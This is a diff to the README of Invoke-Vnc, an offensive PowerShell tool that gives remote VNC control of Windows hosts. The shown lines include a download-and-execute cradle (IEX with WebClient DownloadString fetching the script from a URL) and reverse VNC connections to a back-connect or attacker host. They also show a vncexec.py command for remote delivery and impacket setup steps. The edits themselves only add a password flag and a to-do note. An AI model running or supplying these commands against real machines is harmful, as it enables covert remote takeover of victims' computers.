@@ -12,7 +12,7 @@ Import-Module Invoke-Vnc.ps1
 #Reverse VNC connection
 Invoke-Vnc -ConType reverse -IpAddress <backconnect_ip> -Port 5500 -Password P@ssw0rd
 #Bind VNC connection
-Invoke-Vnc -ConType bind -Port 5900
+Invoke-Vnc -ConType bind -Port 5900 -Password P@ssw0rd
 ```
 
 Invoke over net:
@@ -21,11 +21,11 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 #Reverse VNC connection
 Invoke-Vnc -ConType reverse -IpAddress <backconnect_ip> -Port 5500 -Password P@ssw0rd
 #Bind VNC connection
-Invoke-Vnc -ConType bind -Port 5900
+Invoke-Vnc -ConType bind -Port 5900 -Password P@ssw0rd
 ```
 
 Launch VNC listener to catch reverse VNC connection:
-```bash
+```
 vncviewer –listen <port>
 ```
 
@@ -43,7 +43,7 @@ vncexec.py -bc-ip <attacker's_host> -httpport 8080 -invoke-vnc-path Invoke-Vnc.p
 ```
 
 Script depends on a recent build of impacket library. Get it at https://github.com/CoreSecurity/impacket
-```bash
+```
 git clone https://github.com/CoreSecurity/impacket
 cd impacket
 sudo python setup.py install
@@ -52,6 +52,12 @@ sudo python setup.py install
 Build notes
 ----------
 Project is built using Visual Studio 2013. To successfully build the solution you need python to be available at C:\Python27\python.exe. Both x86 and x64 configurations must be built in order to update Invoke-Vnc.ps1 script.
+
+
+To-do
+--------
+- Fix session tracking
+
 
 Author
 ------
